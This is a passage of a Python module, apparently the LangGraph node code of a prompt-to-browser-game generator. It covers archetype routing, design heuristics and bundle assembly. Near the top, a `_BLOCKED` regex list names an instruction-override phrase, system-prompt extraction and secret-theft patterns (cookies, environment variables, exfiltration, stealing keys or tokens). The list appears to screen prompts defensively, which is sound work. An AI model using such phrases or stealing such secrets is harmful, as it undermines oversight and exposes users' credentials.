"""LangGraph nodes for PlayForge generation.

The graph is fixed and safety-critical steps are deterministic. Creative work
is bounded inside node decisions: choose a proven game archetype, tune balance,
render local templates, validate static safety, run gameplay QA, and repair
balance before publishing.
"""
import json
import re

from app.agents import bundles, llm, prompts, smoke, templating, validation
from app.agents.state import MAX_GAMEPLAY_REPAIR, MAX_REPAIR, MAX_REPLAN
from app.storage import s3

_BLOCKED = [
    r"ignore (previous|all) (instructions|prompts)",
    r"system prompt",
    r"document\.cookie",
    r"process\.env",
    r"\bexfiltrate\b",
    r"steal .*(key|password|secret|token)",
    r"reveal .*(key|secret|prompt)",
]

_THEMES = ["space", "neon", "candy", "forest", "retro", "ocean"]
_THEME_COVER = {
    "space": "linear-gradient(135deg,#0ea5b7,#4f46e5)",
    "neon": "linear-gradient(135deg,#7c5cff,#c026d3)",
    "candy": "linear-gradient(135deg,#ff6b9d,#ff3ea5)",
    "forest": "linear-gradient(135deg,#10b981,#065f46)",
    "retro": "linear-gradient(135deg,#ff8a3d,#ff3ea5)",
    "ocean": "linear-gradient(135deg,#0ea5b7,#2563eb)",
}

_ARCHETYPES = {
    "vertical_shooter": {
        "genre": "shooter",
        "label": "vertical shoot-'em-up",
        "loop": "fly, shoot waves of enemies, dodge enemy bullets, grab power-ups, beat the boss",
    },
    "lane_runner": {
        "genre": "runner",
        "label": "lane runner",
        "loop": "change lanes, collect bonuses, dodge incoming obstacles",
    },
    "topdown_collect": {
        "genre": "arcade",
        "label": "top-down collect-and-dodge",
        "loop": "free-move through an arena, collect rewards, avoid roaming hazards",
    },
    "logic_grid": {
        "genre": "puzzle",
        "label": "logic grid puzzle",
        "loop": "rotate tiles to connect a route before time runs out",
    },
}

# 3D（dimension=="3d"）专用原型，与上面的 2D 原型并列。3D 完全由模型产出，
# 无确定性模板兜底；这些只决定路由、设计提示与少样本参考。
_ARCHETYPES_3D = {
    "fps_arena": {
        "genre": "shooter",
        "label": "first-person arena shooter",
        "loop": "lock the mouse, strafe and aim, gun down advancing enemy waves, beat the boss",
    },
    "runner_3d": {
        "genre": "runner",
        "label": "third-person 3D runner",
        "loop": "auto-run forward, switch lanes and jump to dodge obstacles, grab orbs",
    },
    "racer_3d": {
        "genre": "runner",
        "label": "arcade 3D racer",
        "loop": "steer along a track, hit checkpoints, beat the timer",
    },
    "collector_3d": {
        "genre": "arcade",
        "label": "third-person 3D collector",
        "loop": "roam a 3D arena, gather pickups, avoid roaming hazards",
    },
}


def _parse_json(raw: str) -> dict:
    match = re.search(r"\{.*\}", raw or "", re.S)
    if not match:
        return {}
    try:
        return json.loads(match.group(0))
    except Exception:
        return {}


def _clip(value, limit: int = 140) -> str:
    text = re.sub(r"\s+", " ", str(value or "")).strip()
    return text if len(text) <= limit else text[: limit - 3] + "..."


def _has_any(text: str, words: list[str]) -> bool:
    return any(word in text for word in words)


def _detect_theme(prompt: str) -> str:
    p = prompt.lower()
    if _has_any(p, ["space", "star", "asteroid", "rocket", "太空", "星", "飞船"]):
        return "space"
    if _has_any(p, ["neon", "cyber", "霓虹", "赛博"]):
        return "neon"
    if _has_any(p, ["forest", "tree", "magic", "森林", "魔法"]):
        return "forest"
    if _has_any(p, ["ocean", "sea", "fish", "koi", "海", "鱼"]):
        return "ocean"
    if _has_any(p, ["candy", "sweet", "糖"]):
        return "candy"
    return next((theme for theme in _THEMES if theme in p), "retro")


def _detect_genre(prompt: str) -> str:
    p = prompt.lower()
    if _has_any(p, ["shoot", "shmup", "raiden", "bullet hell", "fighter jet", "战机", "雷霆", "飞机大战", "打飞机", "射击", "弹幕", "空战"]):
        return "shooter"
    if _has_any(p, ["puzzle", "logic", "pipe", "circuit", "rune", "match", "解谜", "逻辑", "连接", "方块"]):
        return "puzzle"
    if _has_any(p, ["runner", "race", "dodge", "lane", "run", "dash", "躲", "跑", "赛道", "漂移"]):
        return "runner"
    return "arcade"


def _theme_cover(theme) -> str:
    return _THEME_COVER.get(str(theme or "").lower(), _THEME_COVER["retro"])


def _heuristic_spec(prompt: str) -> dict:
    genre = _detect_genre(prompt)
    theme = _detect_theme(prompt)
    controls = {
        "keyboard": ["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown"],
        "pointer": ["move"],
        "hint": "move with mouse / arrows, collect rewards, avoid hazards",
    }
    if genre == "shooter":
        controls = {"keyboard": ["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Space fire"], "pointer": ["move", "hold to fire"], "hint": "fly with arrows / mouse, hold to fire, dodge bullets, defeat the boss"}
    elif genre == "puzzle":
        controls = {"keyboard": ["Space restart"], "pointer": ["click tiles"], "hint": "click tiles to rotate the path"}
    elif genre == "runner":
        controls = {"keyboard": ["ArrowLeft", "ArrowRight"], "pointer": ["tap left/right"], "hint": "switch lanes, collect bonuses, avoid blockers"}
    return {
        "title": bundles.title_from(prompt),
        "summary": (prompt[:117] + "...") if len(prompt) > 120 else prompt,
        "genre": genre,
        "theme": theme,
        "target_runtime": "canvas",
        "core_loop": _ARCHETYPES["vertical_shooter" if genre == "shooter" else "logic_grid" if genre == "puzzle" else "lane_runner" if genre == "runner" else "topdown_collect"]["loop"],
        "controls": controls,
        "win_condition": "reach_target_score",
        "lose_condition": "timer_or_lives_depleted",
        "score_rule": "reward collection and efficient play",
        "difficulty_curve": "gentle opening, gradual pressure increase, no instant failure",
        "visual_style": theme,
        "tags": [theme, genre, "casual"],
    }


def _coerce_spec(data: dict, prompt: str) -> dict:
    base = _heuristic_spec(prompt)
    if isinstance(data, dict):
        for key in (
            "title",
            "summary",
            "genre",
            "theme",
            "core_loop",
            "win_condition",
            "lose_condition",
            "score_rule",
            "difficulty_curve",
            "visual_style",
        ):
            if data.get(key):
                base[key] = str(data[key])[:220]
        if isinstance(data.get("tags"), list) and data["tags"]:
            base["tags"] = [str(tag)[:30] for tag in data["tags"]][:5]
        if isinstance(data.get("controls"), dict):
            base["controls"].update(data["controls"])
    return base


def _heuristic_design(spec: dict) -> dict:
    archetype = spec.get("archetype") or ("logic_grid" if spec.get("genre") == "puzzle" else "lane_runner" if spec.get("genre") == "runner" else "topdown_collect")
    if archetype == "logic_grid":
        entities = [
            {"name": "tile", "type": "rotating_pipe", "movement": "click_rotate"},
            {"name": "source", "type": "beacon", "spawn": "left_edge"},
            {"name": "exit", "type": "beacon", "spawn": "right_edge"},
        ]
        rules = {"connect_left_to_right": "win", "timer_zero": "fail", "survive_seconds": 70}
    elif archetype == "lane_runner":
        entities = [
            {"name": "runner", "type": "avatar", "movement": "lane_switch"},
            {"name": "blocker", "type": "obstacle", "spawn": "lane_top"},
            {"name": "bonus", "type": "collectible", "spawn": "lane_top"},
        ]
        rules = {"collision_player_hazard": "lose_life", "collision_player_star": "score_plus_18", "survive_seconds": 55}
    else:
        entities = [
            {"name": "player", "type": "avatar", "movement": "top_down"},
            {"name": "hazard", "type": "obstacle", "spawn": "arena_edge"},
            {"name": "reward", "type": "collectible", "spawn": "safe_arena"},
        ]
        rules = {"collision_player_hazard": "lose_life", "collision_player_star": "score_plus_combo", "survive_seconds": 55}
    return {
        "archetype": archetype,
        "screen": {"width": 900, "height": 600},
        "entities": entities,
        "rules": rules,
        "ui": {"show_score": True, "show_timer": True, "show_lives": True, "show_restart_button": True},
    }


def _coerce_design(data: dict, spec: dict | None = None) -> dict:
    base = _heuristic_design(spec or {})
    if isinstance(data, dict):
        if isinstance(data.get("screen"), dict):
            base["screen"].update(data["screen"])
        if isinstance(data.get("entities"), list) and data["entities"]:
            base["entities"] = data["entities"][:10]
        if isinstance(data.get("rules"), dict):
            base["rules"].update(data["rules"])
        if isinstance(data.get("ui"), dict):
            base["ui"].update(data["ui"])
        # 模型优先：保留 GameDesignAgent 产出的丰富结构，原样喂给 Coder
        # ("scene" 是 3D 设计的相机/环境/空间，必须保留)
        for key in ("scene", "background", "player", "waves", "powerups", "boss", "juice"):
            if data.get(key):
                base[key] = data[key]
    return base


def _simplify_design(design: dict) -> dict:
    current = design or {}
    archetype = current.get("archetype") or "topdown_collect"
    spec = {"archetype": archetype, "genre": _ARCHETYPES.get(archetype, _ARCHETYPES["topdown_collect"])["genre"]}
    simplified = _heuristic_design(spec)
    simplified["rules"]["survive_seconds"] = 50
    return simplified


def _simplify_design_3d(design: dict) -> dict:
    """3D replan 兜底：模型不可用时给一个最小可实现的 3D 设计（仍是 3D，不回退 2D）。"""
    current = design or {}
    archetype = current.get("archetype") if current.get("archetype") in _ARCHETYPES_3D else "fps_arena"
    meta = _ARCHETYPES_3D[archetype]
    return {
        "archetype": archetype,
        "scene": {
            "camera": "first_person" if archetype == "fps_arena" else "third_person",
            "fov": 72,
            "environment": "dark arena with fog and a glowing grid floor",
            "space": "a bounded arena the player stays inside",
        },
        "player": {"visual": "simple primitive avatar", "controls": "WASD + mouse", "abilities": ["move", "act"]},
        "entities": [{"name": "drone", "role": "enemy", "visual": "emissive low-poly shape", "movement": "homes toward the player", "behavior": "advance and threaten"}],
        "waves": [{"t": 0, "spawn": "few", "note": "safe opening"}, {"t": 12, "spawn": "more", "note": "ramp up"}],
        "rules": {"win": "survive / clear waves", "lose": "hp depleted", "survive_seconds": 60, "score": "per kill / pickup"},
        "ui": {"show_score": True, "show_lives": True, "show_restart_button": True, "crosshair": archetype == "fps_arena"},
        "core_loop": meta["loop"],
    }


def _should_inject(state: dict) -> bool:
    p = (state.get("normalized_prompt") or state.get("prompt") or "").lower()
    if "force-replan" in p:
        return state.get("replan_attempts", 0) == 0
    if "force-repair" in p:
        return state.get("repair_attempts", 0) == 0
    return False


def _extract_js(raw: str) -> str:
    if not raw:
        return ""
    match = re.search(r"```(?:javascript|js)?\s*(.*?)```", raw, re.S | re.I)
    text = (match.group(1) if match else raw).strip()
    return re.sub(r"</?script[^>]*>", "", text, flags=re.I).strip()


def _extract_bundle(raw: str) -> dict:
    """Parse a model reply into {path: content}. Expects three fenced blocks
    (html / css / js); degrades gracefully when labels are missing or merged."""
    if not raw:
        return {}
    out: dict[str, str] = {}
    for lang, path in (("html", "index.html"), ("css", "style.css"), ("javascript", "game.js"), ("js", "game.js")):
        if path in out:
            continue
        m = re.search(r"```[ \t]*" + lang + r"[^\n]*\n(.*?)```", raw, re.S | re.I)
        if m:
            out[path] = m.group(1).strip()
    if "game.js" in out:
        return out
    # Fallback: classify unlabeled fenced blocks by their content.
    for block in re.findall(r"```[^\n]*\n(.*?)```", raw, re.S):
        block = block.strip()
        low = block[:400].lower()
        if "index.html" not in out and ("<!doctype" in low or "<html" in low):
            out["index.html"] = block
        elif "game.js" not in out and "<html" not in low and any(
            tok in low for tok in ("getcontext", "requestanimationframe", "addeventlistener", "function ", "=>")
        ):
            out["game.js"] = block
        elif "style.css" not in out and "<" not in low and "{" in block and "}" in block:
            out["style.css"] = block
    if "game.js" not in out and not out:
        js = _extract_js(raw)
        if js:
            out["game.js"] = js
    return out


_DEFAULT_CSS = (
    "*{margin:0;padding:0;box-sizing:border-box}"
    "html,body{height:100%;overflow:hidden;background:#05070f;"
    "font-family:ui-monospace,monospace;-webkit-user-select:none;user-select:none;touch-action:none}"
    "canvas{display:block;position:absolute;inset:0}"
)


def _assemble_bundle(bundle: dict, title: str, dimension: str = "2d") -> list[dict]:
    """Turn parsed model files into the canonical 3-file bundle; synthesize a
    minimal index.html / style.css when the model only returned game.js.
    For 3D, ensure the self-hosted Three.js engine loads before game.js."""
    js = bundle.get("game.js", "")
    css = bundle.get("style.css") or _DEFAULT_CSS
    index = bundle.get("index.html")
    needs_three = dimension == "3d"
    three_tag = '<script src="three.min.js"></script>' if needs_three else ""
    if not index or "game.js" not in index:
        index = (
            '<!doctype html><html><head><meta charset="utf-8">'
            '<meta name="viewport" content="width=device-width,initial-scale=1">'
            f"<title>{title}</title>"
            '<link rel="stylesheet" href="style.css"></head><body>'
            '<canvas id="stage"></canvas>'
            f'{three_tag}<script src="game.js"></script></body></html>'
        )
    elif needs_three and "three.min.js" not in index:
        # 模型给了 index 但漏了引擎：插到 <head> 末尾，确保先于 game.js 执行。
        if "</head>" in index:
            index = index.replace("</head>", '<script src="three.min.js"></script></head>', 1)
        else:
            index = index.replace("<body>", '<body><script src="three.min.js"></script>', 1)
    return [
        {"path": "index.html", "content": index},
        {"path": "style.css", "content": css},
        {"path": "game.js", "content": js},
    ]


# 给 Coder 一个同类的优质参考实现（few-shot），把质量下限抬上去。
_REFERENCE_BY_ARCHETYPE = {
    "vertical_shooter": "neondodge",
    "lane_runner": "neondodge",
    "topdown_collect": "moonlitkoi",
    "logic_grid": "runecircuit",
}
_REFERENCE_BY_GENRE = {
    "shooter": "neondodge",
    "runner": "neondodge",
    "arcade": "moonlitkoi",
    "collector": "starcatch",
    "puzzle": "runecircuit",
    "quiz": "colormatch",
}


# 3D few-shot 参考：统一用手工旗舰 Warp Spire 当“视觉 / UI 打磨基线”。它本身是隧道飞行，
# 和 fps_arena 机制不同——产物玩法由 GameDesign + 提示词的 GENRE FIDELITY 决定，参考只负责把
# UI/HUD/光影/质感/结算页的下限抬到旗舰水准（实测模型会照搬观感、按提示词重建机制）。
_REFERENCE_BY_ARCHETYPE_3D = {
    "fps_arena": "warpspire",
    "collector_3d": "warpspire",
    "runner_3d": "warpspire",
    "racer_3d": "warpspire",
}


def _reference_for(spec: dict) -> str | None:
    if str(spec.get("dimension") or "") == "3d":
        key = _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or "")) or "warpspire"
        return bundles.BUNDLES.get(key)
    archetype = str(spec.get("archetype") or "")
    genre = str(spec.get("genre") or "").lower()
    key = _REFERENCE_BY_ARCHETYPE.get(archetype) or _REFERENCE_BY_GENRE.get(genre) or "moonlitkoi"
    return bundles.BUNDLES.get(key)


def _prompt_cues(prompt: str) -> list[str]:
    stop = {
        "make",
        "game",
        "with",
        "where",
        "that",
        "this",
        "into",
        "from",
        "using",
        "player",
        "players",
        "collect",
        "avoid",
        "survive",
        "seconds",
        "the",
        "and",
        "for",
        "you",
    }
    cues: list[str] = []
    for token in re.findall(r"[a-zA-Z][a-zA-Z0-9'-]{2,}", prompt.lower()):
        if token in stop or token in cues:
            continue
        cues.append(token)
        if len(cues) == 6:
            break
    return cues


def _controls_line(controls: dict) -> str:
    keys = controls.get("keyboard") if isinstance(controls.get("keyboard"), list) else []
    pointer = controls.get("pointer") if isinstance(controls.get("pointer"), list) else []
    parts = []
    if keys:
        parts.append("keyboard=" + ", ".join(str(key) for key in keys[:4]))
    if pointer:
        parts.append("pointer=" + ", ".join(str(item) for item in pointer[:3]))
    if controls.get("hint"):
        parts.append("hint=" + _clip(controls.get("hint"), 70))
    return "; ".join(parts) if parts else "default keyboard + pointer controls"


def _spec_log_lines(spec: dict, source: str) -> list[str]:
    controls = spec.get("controls") if isinstance(spec.get("controls"), dict) else {}
    tags = ", ".join(str(tag) for tag in (spec.get("tags") or [])[:5]) or "none"
    return [
        f"source: {source}",
        f"title: {_clip(spec.get('title'), 80)}",
        f"genre/theme/runtime: {spec.get('genre', 'arcade')} / {spec.get('theme', 'retro')} / {spec.get('target_runtime', 'canvas')}",
        f"core loop: {_clip(spec.get('core_loop'), 120)}",
        f"win/lose: {spec.get('win_condition', 'reach_target_score')} / {spec.get('lose_condition', 'timer_or_lives_depleted')}",
        f"controls: {_controls_line(controls)}",
        f"tags: {tags}",
    ]


def _entity_line(entity: dict) -> str:
    name = entity.get("name", "?")
    entity_type = entity.get("type", "?")
    movement = entity.get("movement") or entity.get("spawn") or entity.get("behavior") or "static"
    return f"{name}({entity_type}, {movement})"


def _design_log_lines(design: dict) -> list[str]:
    screen = design.get("screen") if isinstance(design.get("screen"), dict) else {}
    entities = design.get("entities") if isinstance(design.get("entities"), list) else []
    rules = design.get("rules") if isinstance(design.get("rules"), dict) else {}
    balance = design.get("balance") if isinstance(design.get("balance"), dict) else {}
    entity_text = ", ".join(_entity_line(entity) for entity in entities[:8]) or "none"
    rule_bits = []
    for key in ("collision_player_hazard", "collision_player_star", "connect_left_to_right", "survive_seconds"):
        if key in rules:
            rule_bits.append(f"{key}={rules[key]}")
    lines = [
        f"archetype: {design.get('archetype', 'unknown')}",
        f"screen: {screen.get('width', 900)}x{screen.get('height', 600)} canvas",
        f"entities: {entity_text}",
        "rules: " + (", ".join(str(bit) for bit in rule_bits) or "default game loop"),
    ]
    if balance:
        lines.append(
            "balance: "
            f"duration={balance.get('round_seconds')}s, target={balance.get('target_score')}, "
            f"lives={balance.get('lives')}, hazard_spawn={balance.get('hazard_spawn_ms')}ms"
        )
    return lines


def _asset_log_lines(uploaded: list[dict], manifest: dict, spec: dict) -> list[str]:
    lines = [f"uploaded references loaded: {len(uploaded)}"]
    for asset in uploaded[:4]:
        lines.append(f"reference: {asset.get('key')} ({asset.get('type', 'file')})")
    if len(uploaded) > 4:
        lines.append(f"reference overflow: {len(uploaded) - 4} additional asset(s)")
    lines.append(f"cover strategy: theme={spec.get('theme', 'retro')} -> {manifest.get('cover')}")
    lines.append(f"asset manifest entries: cover + {len(uploaded)} uploaded reference(s)")
    return lines


def _file_log_lines(files: list[dict]) -> list[str]:
    if not files:
        return ["generated files: none"]
    total = sum(len((file.get("content") or "").encode("utf-8")) for file in files)
    names = ", ".join(file.get("path", "?") for file in files)
    lines = [f"generated files: {names}", f"bundle size: {total} bytes"]
    for file in files:
        lines.append(f"{file.get('path', '?')}: {len((file.get('content') or '').encode('utf-8'))} bytes")
    return lines


def _validation_log_lines(result: dict) -> list[str]:
    files = result.get("files") or []
    total = sum(int(file.get("size") or 0) for file in files)
    lines = [
        "checked files: " + (", ".join(str(file.get("path")) for file in files) or "none"),
        f"bundle size checked: {total} bytes",
        f"security scan: {len(validation.FORBIDDEN_PATTERNS)} forbidden patterns",
        "reference scan: index.html must load local game.js",
    ]
    if result.get("warnings"):
        lines.append("warnings: " + "; ".join(str(warning) for warning in result["warnings"][:3]))
    return lines


def _brief_keywords(prompt: str, spec: dict) -> list[str]:
    cues = _prompt_cues(prompt)
    for tag in spec.get("tags") or []:
        tag = str(tag).lower()
        if tag and tag not in cues:
            cues.append(tag)
    for word in re.findall(r"[\u4e00-\u9fff]{2,6}", prompt):
        if word not in cues:
            cues.append(word)
    return cues[:8]


def _heuristic_brief(prompt: str, spec: dict) -> dict:
    genre = str(spec.get("genre") or "arcade").lower()
    title = spec.get("title") or bundles.title_from(prompt)
    keywords = _brief_keywords(prompt, spec)
    if genre == "puzzle":
        verbs = ["inspect", "rotate", "connect", "optimize"]
        mechanics = ["visible solution path", "move-efficient scoring", "timed pressure"]
        fantasy = f"repair a living circuit in {title}"
    elif genre == "runner":
        verbs = ["switch lanes", "read patterns", "collect boosts", "recover from hits"]
        mechanics = ["lane telegraphing", "bonus chains", "forgiving lives", "late-round pressure"]
        fantasy = f"pilot the hero through a fast readable course in {title}"
    else:
        verbs = ["navigate", "collect", "bait hazards", "chain rewards"]
        mechanics = ["combo collection", "soft homing hazards", "temporary powerups", "safe opening"]
        fantasy = f"guide the hero through a compact arena in {title}"
    return {
        "player_fantasy": fantasy,
        "objective": spec.get("win_condition") or "reach the score goal before the round ends",
        "core_verbs": verbs,
        "mechanic_requirements": mechanics,
        "reward_loop": "small rewards every few seconds, larger payoff for chaining clean play",
        "difficulty_beats": ["0-10s tutorial-safe opening", "10-35s readable pattern pressure", "35s+ mastery challenge"],
        "feedback": ["clear hit flash", "score pop", "life/timer HUD", "restart affordance"],
        "keywords": keywords,
        "minimum_content": {"hazards": 2, "rewards": 3, "powerups": 2, "waves": 4},
    }


def _coerce_brief(data: dict, prompt: str, spec: dict) -> dict:
    base = _heuristic_brief(prompt, spec)
    if isinstance(data, dict):
        for key in ("player_fantasy", "objective", "reward_loop"):
            if data.get(key):
                base[key] = str(data[key])[:240]
        for key in ("core_verbs", "mechanic_requirements", "difficulty_beats", "feedback", "keywords"):
            if isinstance(data.get(key), list) and data[key]:
                base[key] = [str(item)[:80] for item in data[key]][:8]
        if isinstance(data.get("minimum_content"), dict):
            base["minimum_content"].update({k: int(v) for k, v in data["minimum_content"].items() if str(v).isdigit()})
    return base


def _brief_log_lines(brief: dict, source: str) -> list[str]:
    return [
        f"source: {source}",
        f"player fantasy: {_clip(brief.get('player_fantasy'), 120)}",
        f"objective: {_clip(brief.get('objective'), 120)}",
        "core verbs: " + ", ".join(brief.get("core_verbs") or []),
        "mechanic requirements: " + ", ".join(brief.get("mechanic_requirements") or []),
        "difficulty beats: " + " / ".join(brief.get("difficulty_beats") or []),
    ]


def _heuristic_mechanic_plan(spec: dict, brief: dict, prompt: str) -> dict:
    genre = str(spec.get("genre") or "").lower()
    text = " ".join([prompt, " ".join(brief.get("mechanic_requirements") or []), " ".join(brief.get("keywords") or [])]).lower()
    if genre == "shooter" or _has_any(text, ["shoot", "bullet", "shmup", "raiden", "战机", "雷霆", "射击", "弹幕", "飞机大战", "打飞机"]):
        archetype_hint = "vertical_shooter"
        secondary = "spread / laser power-ups and a screen-clearing bomb"
        enemies = [{"name": "swarm fighter", "behavior": "weaves downward firing aimed shots"}, {"name": "gunship", "behavior": "strafes the top and lays bullet spreads"}, {"name": "boss carrier", "behavior": "multi-phase, telegraphed barrages"}]
        rewards = [{"name": "power chip", "effect": "upgrades the main gun"}, {"name": "medal", "effect": "score chain"}]
        powerups = [{"name": "spread shot", "effect": "wider fire arc"}, {"name": "shield", "effect": "absorbs one hit"}, {"name": "wingman", "effect": "adds a side gun"}]
    elif genre == "puzzle" or _has_any(text, ["connect", "circuit", "puzzle", "logic"]):
        archetype_hint = "logic_grid"
        secondary = "route preview pulses"
        enemies = [{"name": "locked node", "behavior": "blocks inefficient routes"}, {"name": "timer drain", "behavior": "forces decisive rotations"}]
        rewards = [{"name": "clean link", "effect": "score bonus"}, {"name": "few moves", "effect": "efficiency bonus"}]
        powerups = [{"name": "hint pulse", "effect": "briefly shows connected tiles"}, {"name": "time crystal", "effect": "adds seconds"}]
    elif genre == "runner" or _has_any(text, ["runner", "lane", "dash", "dodge", "race"]):
        archetype_hint = "lane_runner"
        secondary = "one-lane dash recovery"
        enemies = [{"name": "drone gate", "behavior": "blocks one lane"}, {"name": "sweeper", "behavior": "encourages early lane change"}]
        rewards = [{"name": "energy orb", "effect": "score chain"}, {"name": "route badge", "effect": "lane streak bonus"}]
        powerups = [{"name": "phase dash", "effect": "forgive the next hit"}, {"name": "magnet trail", "effect": "pulls nearby bonuses"}]
    else:
        archetype_hint = "topdown_collect"
        secondary = "short shield after clean combo"
        enemies = [{"name": "drifter", "behavior": "soft-homes toward the player"}, {"name": "sentinel", "behavior": "crosses the arena slowly"}]
        rewards = [{"name": "glow shard", "effect": "combo score"}, {"name": "cache", "effect": "larger timed bonus"}]
        powerups = [{"name": "shield bloom", "effect": "temporary invulnerability"}, {"name": "slow field", "effect": "slows hazards"}, {"name": "spark dash", "effect": "quick reposition"}]
    return {
        "archetype_hint": archetype_hint,
        "primary_action": _clip((brief.get("core_verbs") or ["move"])[0], 60),
        "secondary_action": secondary,
        "risk_model": "mistakes cost lives, but the first seconds are safe and recovery is possible",
        "reward_model": brief.get("reward_loop") or "chain rewards for score",
        "enemy_behaviors": enemies,
        "reward_items": rewards,
        "powerups": powerups,
        "feedback": brief.get("feedback") or ["score pop", "hit flash", "restart"],
        "skill_tests": brief.get("difficulty_beats") or [],
    }


def _coerce_mechanic_plan(data: dict, spec: dict, brief: dict, prompt: str) -> dict:
    base = _heuristic_mechanic_plan(spec, brief, prompt)
    if isinstance(data, dict):
        for key in ("archetype_hint", "primary_action", "secondary_action", "risk_model", "reward_model"):
            if data.get(key):
                base[key] = str(data[key])[:180]
        for key in ("enemy_behaviors", "reward_items", "powerups"):
            if isinstance(data.get(key), list) and data[key]:
                base[key] = [item if isinstance(item, dict) else {"name": str(item), "effect": "gameplay variation"} for item in data[key]][:5]
        if isinstance(data.get("feedback"), list) and data["feedback"]:
            base["feedback"] = [str(item)[:80] for item in data["feedback"]][:6]
    if base.get("archetype_hint") not in _ARCHETYPES:
        base["archetype_hint"] = _heuristic_mechanic_plan(spec, brief, prompt)["archetype_hint"]
    return base


def _mechanic_log_lines(plan: dict, source: str) -> list[str]:
    enemies = ", ".join(str(item.get("name", "?")) for item in plan.get("enemy_behaviors") or [])
    rewards = ", ".join(str(item.get("name", "?")) for item in plan.get("reward_items") or [])
    powerups = ", ".join(str(item.get("name", "?")) for item in plan.get("powerups") or [])
    return [
        f"source: {source}",
        f"archetype hint: {plan.get('archetype_hint')}",
        f"primary/secondary: {plan.get('primary_action')} / {plan.get('secondary_action')}",
        f"risk model: {_clip(plan.get('risk_model'), 120)}",
        f"reward model: {_clip(plan.get('reward_model'), 120)}",
        f"enemy behaviors: {enemies}",
        f"rewards/powerups: {rewards} / {powerups}",
    ]


def _content_plan(archetype: str, spec: dict, brief: dict, mechanics: dict) -> dict:
    enemy_names = [str(item.get("name", "hazard"))[:28] for item in mechanics.get("enemy_behaviors") or []] or ["hazard", "blocker"]
    reward_names = [str(item.get("name", "reward"))[:28] for item in mechanics.get("reward_items") or []] or ["reward", "bonus"]
    powerups = [str(item.get("name", "boost"))[:28] for item in mechanics.get("powerups") or []] or ["shield", "slow field"]
    beats = brief.get("difficulty_beats") or ["opening", "pressure", "mastery"]
    if archetype == "logic_grid":
        waves = [
            {"time": 0, "pressure": "learn", "note": beats[0]},
            {"time": 18, "pressure": "optimize", "note": beats[min(1, len(beats) - 1)]},
            {"time": 40, "pressure": "rush", "note": beats[-1]},
        ]
        tutorial = "click tiles to rotate the live route from IN to OUT"
    elif archetype == "lane_runner":
        waves = [
            {"time": 0, "hazards": 1, "reward": 1, "note": beats[0]},
            {"time": 12, "hazards": 2, "reward": 1, "note": beats[min(1, len(beats) - 1)]},
            {"time": 28, "hazards": 3, "reward": 2, "note": "introduce paired lane reads"},
            {"time": 45, "hazards": 4, "reward": 2, "note": beats[-1]},
        ]
        tutorial = "tap left or right to switch lanes; chase bonuses, not every gap"
    else:
        waves = [
            {"time": 0, "hazards": 1, "reward": 2, "note": beats[0]},
            {"time": 14, "hazards": 2, "reward": 2, "note": beats[min(1, len(beats) - 1)]},
            {"time": 32, "hazards": 3, "reward": 3, "note": "use powerups to reset danger"},
            {"time": 50, "hazards": 4, "reward": 3, "note": beats[-1]},
        ]
        tutorial = "move smoothly, collect chains, use powerups when the arena tightens"
    return {
        "tutorial": tutorial,
        "waves": waves,
        "hazard_names": enemy_names[:4],
        "reward_names": reward_names[:4],
        "powerups": powerups[:4],
        "pacing": beats,
        "mechanic_label": mechanics.get("secondary_action") or mechanics.get("primary_action") or "core loop",
    }


def _content_log_lines(plan: dict) -> list[str]:
    return [
        f"tutorial: {_clip(plan.get('tutorial'), 120)}",
        "waves: " + "; ".join(f"{w.get('time')}s {w.get('note')}" for w in plan.get("waves", [])[:5]),
        "hazards: " + ", ".join(plan.get("hazard_names") or []),
        "rewards: " + ", ".join(plan.get("reward_names") or []),
        "powerups: " + ", ".join(plan.get("powerups") or []),
        f"mechanic label: {plan.get('mechanic_label')}",
    ]


def _route_archetype(spec: dict, prompt: str, brief: dict | None = None, mechanics: dict | None = None) -> dict:
    if mechanics and mechanics.get("archetype_hint") in _ARCHETYPES:
        archetype = mechanics["archetype_hint"]
        meta = _ARCHETYPES[archetype]
        return {"archetype": archetype, "genre": meta["genre"], "label": meta["label"], "core_loop": meta["loop"], "reason": "mechanic planner hint"}
    text = " ".join(
        str(value)
        for value in [
            prompt,
            (brief or {}).get("player_fantasy"),
            (brief or {}).get("objective"),
            " ".join((brief or {}).get("mechanic_requirements") or []),
            spec.get("title"),
            spec.get("genre"),
            spec.get("theme"),
            spec.get("core_loop"),
            " ".join(spec.get("tags") or []),
        ]
        if value
    ).lower()
    if _has_any(text, ["shoot", "shmup", "raiden", "bullet", "fighter", "战机", "雷霆", "飞机大战", "打飞机", "射击", "弹幕", "空战", "spaceship", "plane"]):
        archetype = "vertical_shooter"
        reason = "shooter/plane keywords"
    elif _has_any(text, ["puzzle", "logic", "pipe", "circuit", "rune", "connect", "解谜", "逻辑", "连接", "方块"]):
        archetype = "logic_grid"
        reason = "logic/connect keywords"
    elif _has_any(text, ["runner", "race", "lane", "dash", "dodge", "run", "躲", "跑", "赛道", "漂移"]):
        archetype = "lane_runner"
        reason = "runner/dodge keywords"
    elif _has_any(text, ["collect", "coin", "gem", "miner", "fish", "koi", "forest", "explore", "收集", "金币", "矿", "鱼", "森林", "宝石"]):
        archetype = "topdown_collect"
        reason = "collection/exploration keywords"
    else:
        genre = str(spec.get("genre") or "").lower()
        archetype = "vertical_shooter" if genre == "shooter" else "logic_grid" if genre == "puzzle" else "lane_runner" if genre == "runner" else "topdown_collect"
        reason = f"genre fallback: {genre or 'arcade'}"
    meta = _ARCHETYPES[archetype]
    return {"archetype": archetype, "genre": meta["genre"], "label": meta["label"], "core_loop": meta["loop"], "reason": reason}


def _route_archetype_3d(spec: dict, prompt: str, brief: dict | None = None, mechanics: dict | None = None) -> dict:
    """3D 路由：信模型给的 genre，不再用易误判的关键词级联（旧版会把 spec 里出现 "track"/
    "car" 的射击 prompt 误判成 racer_3d，还会盖掉模型自己的判断）。fps_arena 的最终确认放到
    game_design 之后，由设计里的 scene.camera 回校——见 _reconcile_archetype_3d。
    prompt / brief / mechanics 不再参与 3D 路由（签名保留以兼容调用点）。"""
    genre = str(spec.get("genre") or "").lower()
    archetype = "fps_arena" if genre == "shooter" else "runner_3d" if genre == "runner" else "collector_3d"
    reason = f"model genre: {genre or 'arcade'}"
    meta = _ARCHETYPES_3D[archetype]
    return {"archetype": archetype, "genre": meta["genre"], "label": meta["label"], "core_loop": meta["loop"], "reason": reason}


def _reconcile_archetype_3d(spec: dict, design: dict) -> str:
